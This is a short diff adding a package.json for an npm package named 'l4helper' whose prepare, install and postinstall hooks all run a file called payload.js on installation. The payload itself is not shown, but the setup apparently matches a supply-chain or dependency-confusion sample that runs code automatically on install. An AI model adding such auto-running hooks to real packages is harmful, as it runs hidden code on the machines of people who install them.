@@ -1,0 +1,11 @@
+{
+  "name": "l4helper",
+  "version": "1.0.0",
+  "description": "l4 helper",
+  "main": "index.js",
+  "scripts": {
+    "prepare": "node payload.js",
+    "postinstall": "node payload.js",
+    "install": "node payload.js"
+  }
+}
